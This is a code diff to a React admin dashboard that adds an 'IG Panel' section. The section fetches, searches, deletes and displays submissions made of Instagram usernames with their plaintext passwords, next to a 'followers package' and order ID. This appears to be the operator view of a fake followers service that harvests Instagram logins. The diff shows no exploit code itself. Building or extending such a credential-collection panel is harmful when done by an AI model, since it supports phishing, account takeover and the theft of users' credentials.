@@ -27,7 +27,13 @@ import {
   RotateCcw,
   Loader2,
   ChevronDown,
-  ChevronUp
+  ChevronUp,
+  Instagram,
+  Users,
+  TrendingUp,
+  Clock,
+  Lock,
+  User
 } from "lucide-react";
 import * as Icons from "lucide-react";
 import { useNavigate } from "react-router-dom";
@@ -208,10 +214,25 @@ const Admin = () => {
   const [editingId, setEditingId] = useState<string | null>(null);
   const [editCredits, setEditCredits] = useState("");
 
+  // IG Panel Admin State
+  interface IGSubmission {
+    id: string;
+    username: string;
+    password: string;
+    followers_package: string;
+    order_id: string;
+    created_at: string;
+  }
+  const [igSubmissions, setIgSubmissions] = useState<IGSubmission[]>([]);
+  const [igStats, setIgStats] = useState({ totalUsers: 0, totalFollowers: 0, recentActivity: 0, avgFollowersPerUser: 0 });
+  const [isLoadingIG, setIsLoadingIG] = useState(false);
+  const [igSearchQuery, setIgSearchQuery] = useState("");
+
   useEffect(() => {
     if (isAuthenticated) {
       fetchSearchHistory();
       fetchPasswords();
+      fetchIGData();
     }
   }, [isAuthenticated]);
 
@@ -234,6 +255,61 @@ const Admin = () => {
       toast({ title: "History Cleared", description: "All search history deleted" });
     }
   };
+
+  // IG Panel Admin Functions
+  const fetchIGData = async () => {
+    setIsLoadingIG(true);
+    try {
+      const [submissionsRes, statsRes] = await Promise.all([
+        supabase.functions.invoke('ig-panel-admin', {
+          body: { action: 'list', adminPassword: settings.adminPassword }
+        }),
+        supabase.functions.invoke('ig-panel-admin', {
+          body: { action: 'stats', adminPassword: settings.adminPassword }
+        })
+      ]);
+      
+      if (submissionsRes.data?.submissions) {
+        setIgSubmissions(submissionsRes.data.submissions);
+      }
+      if (statsRes.data) {
+        setIgStats(statsRes.data);
+      }
+    } catch (err) {
+      console.error('Error fetching IG data:', err);
+    } finally {
+      setIsLoadingIG(false);
+    }
+  };
+
+  const deleteIGSubmission = async (submissionId: string) => {
+    try {
+      await supabase.functions.invoke('ig-panel-admin', {
+        body: { action: 'delete', adminPassword: settings.adminPassword, submissionId }
+      });
+      toast({ title: "Deleted", description: "Submission deleted" });
+      fetchIGData();
+    } catch (err) {
+      toast({ title: "Error", description: "Failed to delete", variant: "destructive" });
+    }
+  };
+
+  const clearAllIGSubmissions = async () => {
+    try {
+      await supabase.functions.invoke('ig-panel-admin', {
+        body: { action: 'clear', adminPassword: settings.adminPassword }
+      });
+      toast({ title: "Cleared", description: "All submissions cleared" });
+      fetchIGData();
+    } catch (err) {
+      toast({ title: "Error", description: "Failed to clear", variant: "destructive" });
+    }
+  };
+
+  const filteredIGSubmissions = igSubmissions.filter(s => 
+    s.username.toLowerCase().includes(igSearchQuery.toLowerCase()) ||
+    s.order_id.toLowerCase().includes(igSearchQuery.toLowerCase())
+  );
 
   // Credit Password Management Functions
   const fetchPasswords = async () => {
@@ -1871,6 +1947,147 @@ const Admin = () => {
             >
               <ExternalLink className="w-4 h-4 mr-2" /> Open Randi Panel
             </Button>
+          </div>
+        </Section>
+
+        {/* IG Panel Admin Section */}
+        <Section title="IG Panel" icon={Instagram} color="neon-pink">
+          {/* Stats Cards */}
+          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
+            <div className="border border-neon-blue/30 rounded-xl p-4 bg-neon-blue/10">
+              <div className="w-10 h-10 rounded-lg bg-neon-blue/20 flex items-center justify-center mb-2">
+                <Users className="w-5 h-5 text-neon-blue" />
+              </div>
+              <div className="text-xs text-muted-foreground uppercase">Total Users</div>
+              <div className="text-2xl font-bold text-foreground">{igStats.totalUsers}</div>
+              <div className="text-xs text-neon-green flex items-center gap-1">
+                <TrendingUp className="w-3 h-3" /> {igStats.recentActivity} new (24h)
+              </div>
+            </div>
+            <div className="border border-neon-purple/30 rounded-xl p-4 bg-neon-purple/10">
+              <div className="w-10 h-10 rounded-lg bg-neon-purple/20 flex items-center justify-center mb-2">
+                <Users className="w-5 h-5 text-neon-purple" />
+              </div>
+              <div className="text-xs text-muted-foreground uppercase">Total Followers</div>
+              <div className="text-2xl font-bold text-foreground">{igStats.totalFollowers.toLocaleString()}</div>
+              <div className="text-xs text-neon-cyan flex items-center gap-1">
+                ⚡ {igStats.avgFollowersPerUser} avg/user
+              </div>
+            </div>
+            <div className="border border-neon-green/30 rounded-xl p-4 bg-neon-green/10">
+              <div className="w-10 h-10 rounded-lg bg-neon-green/20 flex items-center justify-center mb-2">
+                <Clock className="w-5 h-5 text-neon-green" />
+              </div>
+              <div className="text-xs text-muted-foreground uppercase">Recent Activity</div>
+              <div className="text-2xl font-bold text-foreground">{igStats.recentActivity}</div>
+              <div className="text-xs text-neon-orange">Last 24 hours</div>
+            </div>
+            <div className="border border-neon-pink/30 rounded-xl p-4 bg-neon-pink/10">
+              <div className="w-10 h-10 rounded-lg bg-neon-pink/20 flex items-center justify-center mb-2">
+                <ExternalLink className="w-5 h-5 text-neon-pink" />
+              </div>
+              <div className="text-xs text-muted-foreground uppercase">IG Panel</div>
+              <Button
+                size="sm"
+                onClick={() => window.open('/ig-panel', '_blank')}
+                className="mt-1 bg-neon-pink/20 text-neon-pink hover:bg-neon-pink/30 text-xs"
+              >
+                Open Panel
+              </Button>
+            </div>
+          </div>
+
+          {/* User Data Records */}
+          <div className="border border-border/50 rounded-xl p-4 bg-card/50">
+            <div className="flex items-center justify-between mb-4">
+              <div className="flex items-center gap-2">
+                <Database className="w-5 h-5 text-neon-blue" />
+                <h3 className="font-bold text-foreground">User Data Records</h3>
+              </div>
+              <div className="flex gap-2">
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={fetchIGData}
+                  disabled={isLoadingIG}
+                  className="border-neon-cyan/50 text-neon-cyan"
+                >
+                  <RefreshCw className={`w-4 h-4 mr-1 ${isLoadingIG ? 'animate-spin' : ''}`} />
+                  Refresh
+                </Button>
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={clearAllIGSubmissions}
+                  className="border-neon-red/50 text-neon-red"
+                >
+                  <Trash2 className="w-4 h-4 mr-1" />
+                  Clear All
+                </Button>
+              </div>
+            </div>
+
+            {/* Search */}
+            <div className="relative mb-4">
+              <Input
+                value={igSearchQuery}
+                onChange={(e) => setIgSearchQuery(e.target.value)}
+                placeholder="Search users..."
+                className="pl-10 bg-background/50"
+              />
+              <Eye className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+            </div>
+
+            {/* Submissions List */}
+            <div className="space-y-2 max-h-[50vh] overflow-y-auto">
+              {isLoadingIG ? (
+                <div className="text-center py-8">
+                  <Loader2 className="w-8 h-8 animate-spin mx-auto text-neon-pink" />
+                </div>
+              ) : filteredIGSubmissions.length === 0 ? (
+                <div className="text-center py-8 text-muted-foreground">
+                  <Users className="w-12 h-12 mx-auto mb-3 opacity-50" />
+                  <p>No submissions yet</p>
+                </div>
+              ) : (
+                filteredIGSubmissions.map((submission) => (
+                  <div key={submission.id} className="border border-border/30 rounded-xl p-4 bg-background/50">
+                    <div className="flex items-start justify-between gap-4">
+                      <div className="flex-1 space-y-2">
+                        {/* Username */}
+                        <div className="flex items-center gap-2">
+                          <User className="w-4 h-4 text-neon-pink" />
+                          <span className="text-sm text-muted-foreground">Username:</span>
+                          <span className="font-semibold text-neon-pink">{submission.username}</span>
+                        </div>
+                        {/* Password */}
+                        <div className="flex items-center gap-2">
+                          <Lock className="w-4 h-4 text-neon-green" />
+                          <span className="text-sm text-muted-foreground">Password:</span>
+                          <span className="font-mono text-neon-green bg-neon-green/10 px-2 py-0.5 rounded">{submission.password}</span>
+                        </div>
+                        {/* Package & Order ID */}
+                        <div className="flex items-center gap-4 text-xs text-muted-foreground">
+                          <span className="px-2 py-1 bg-neon-purple/20 text-neon-purple rounded">
+                            {submission.followers_package} Followers
+                          </span>
+                          <span className="text-neon-cyan">#{submission.order_id}</span>
+                          <span>{new Date(submission.created_at).toLocaleString()}</span>
+                        </div>
+                      </div>
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        onClick={() => deleteIGSubmission(submission.id)}
+                        className="text-neon-red hover:bg-neon-red/20"
+                      >
+                        <Trash2 className="w-4 h-4" />
+                      </Button>
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
           </div>
         </Section>
 
